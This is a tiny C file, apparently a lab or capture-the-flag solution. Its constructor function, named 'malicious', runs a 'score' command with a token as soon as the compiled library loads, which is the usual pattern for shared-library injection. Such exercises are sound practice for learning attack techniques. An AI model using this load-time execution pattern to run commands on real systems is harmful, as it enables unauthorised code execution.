#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
system("/usr/local/bin/score dff0f9ce-7690-4043-81e2-9a2221361482");
}
